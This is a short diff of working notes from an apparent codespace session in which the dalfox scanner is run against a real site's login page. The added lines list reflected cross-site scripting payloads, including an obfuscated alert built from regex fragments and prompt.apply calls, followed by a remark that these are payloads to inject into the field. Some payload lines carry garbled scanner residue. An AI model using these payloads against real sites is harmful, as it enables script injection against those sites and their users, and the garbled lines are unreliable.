@@ -148,3 +148,12 @@ codespace:/workspaces/UTCPD45-1> dalfox url https://code4rena.com/login         
 [W] Reflected Payload in JS: =prompt.apply(null,[1])am and waiting headless
 [*] ------------------------------------------------------------------------------------------------------------------------------------------
 [*] [duration: 3m15.750751472s][issues: 3] Finish Scan!
+
+
+- NBotes
+
+[W] Reflected Payload in JS: =top[/al/.source+/ert/.source](/XSS/.source)s
+[W] Reflected Payload in JS: =;prompt.apply(null,[1]);ram and waiting headless
+[W] Reflected Payload in JS: =prompt.apply(null,[1])am and waiting headless
+
+- thse are the actual payloads which you can inject into the field
